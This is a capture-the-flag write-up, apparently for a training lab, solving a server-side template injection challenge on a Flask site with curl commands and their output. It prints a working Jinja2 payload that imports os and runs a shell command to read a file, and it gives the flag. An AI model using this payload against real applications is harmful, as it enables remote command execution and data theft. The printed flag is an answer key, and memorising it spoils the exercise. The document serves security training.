## Descripción
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://chatelaine.cylabacademy.net:41614/)!
## Solución
```
┌──(kali㉿kali)-[~]
└─$ BASE="http://chatelaine.cylabacademy.net:43031"
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ curl -i "$BASE/"
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Fri, 02 Oct 2026 02:22:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 567
Connection: close


                <!doctype html>
                <title>SSTI1</title>

                <h1> Home </h1>

                <p> I built a cool website that lets you announce whatever you want!* </p>

                <form action="/" method="POST">
                What do you want to announce: <input name="content" id="announce"> <button type="submit"> Ok </button>
                </form>
                
                <p style="font-size:10px;position:fixed;bottom:10px;left:10px;"> *Announcements may only reach yourself </p>
                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ curl -s -c cookies.txt -b cookies.txt -L -X POST "$BASE/" --data-urlencode 'content={{7*7}}'

                <!doctype html>
                <h1 style="font-size:100px;" align="center">49</h1>                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ curl -s -c cookies.txt -b cookies.txt -L -X POST "$BASE/" --data-urlencode "content={{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}"

                <!doctype html>
                <h1 style="font-size:100px;" align="center">academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}</h1>
```
Solución:
academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}
## Notas adicionales

## Referencias
